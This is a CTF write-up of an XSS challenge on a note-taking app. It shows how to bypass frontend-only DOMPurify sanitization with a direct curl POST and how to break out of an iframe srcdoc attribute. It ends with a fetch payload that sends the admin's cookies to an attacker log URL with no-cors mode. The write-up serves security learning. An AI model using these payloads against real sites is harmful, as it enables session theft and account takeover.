# Refined Notes
> All my friends warned me about xss, so I created this note taking app that only accepts "refined" Notes.

## First look
### User
We are greeted with a simple note taking app. A basic textarea where we can write our notes and a button to save them.  
After creating a note we get redirected to a page where we can view it. The note itself is rendered inside of an iframe.
To get the id of our newly created note we can just look at the URL.  

### Adminbot
We are given a second URL: the adminbot. Here we can pass the id of a note for the admin to visit.  
This looks an awful lot like a xss challenge.

## Solution
As we realized earlier this is probably a xss challenge. Let's start by trying some basic xss payloads:

## Sanitation
Before we start trying to exploit the xss vulnerability we should take a look at the sanitation of the input.
We start by trying to pass a simple script tag:
```html
<script>alert(1)</script>
```
which get sanitized away.
By looking around the linked files we find a small JS script at `/static/script.js`:
```js
submit.addEventListener('click', (e) => {
    const purified = DOMPurify.sanitize(note.value);
    fetch("/", {
        method: "POST",
        body: purified
    }).then(response => response.text()).then((id) => {
        window.history.pushState({page: ''}, id, `/${id}`);
        submit.classList.add('hidden');
        note.classList.add('hidden');
        noteframe.classList.remove('hidden');
        noteframe.srcdoc = purified;
    });
});
```
As we can see the input is sanitized in the frontend, let's hope that the backend doesn't sanitize it again.
So using curl to send a POST request with the payload:
```sh
curl --location 'https://the-sound-of-silence--eurythmics-1333.ctf.kitctf.de' \
-H 'User-Agent: friendlyHuman' \
-H 'Content-Type: text/plain' \
--data '<img src=x onerror="alert(1)">'
```
we are lucky enough that the payload doesn't get sanitized again.
Taking a closer look at the iframe in which the note is rendered we see that the `srcdoc` property is set:
```html
<iframe srcdoc="<img src="x">">...</iframe>
```
This looks dangerous as if we can break out of the `srcdoc` property and add our own properties to the iframe.

### Breaking out of the srcdoc property
Let's try to just pass a double quote at the start of our note and add a simple onload property to the iframe:
```html
" onload="alert(1)
```
which yields the following iframe:
```html
<iframe ... srcdoc="" onload="alert(1)"></iframe>
```
and opens an alert box.

### CORS what else?
Now that we can execute JS in the context of the adminbot we can try to steal the admin's cookies by adding a simple fetch request to the iframe's onload event:
```
" onload="fetch('<some-url-where-we-can-view-logs>', {method: 'POST', body: JSON.stringify({cookie: document.cookie})})
```
But this doesn't work as the adminbot is hosted on a different domain and thus we can't send the request due to CORS.

###
To bypass the CORS policy we can set the mode of the fetch request to `no-cors`:
```
" onload="fetch('<some-url-where-we-can-view-logs>', {method: 'POST', body: JSON.stringify({cookie: document.cookie}), mode: 'no-cors'})
```
Now that we can steal the admin's cookies we can just send the id to the adminbot and get the flag.
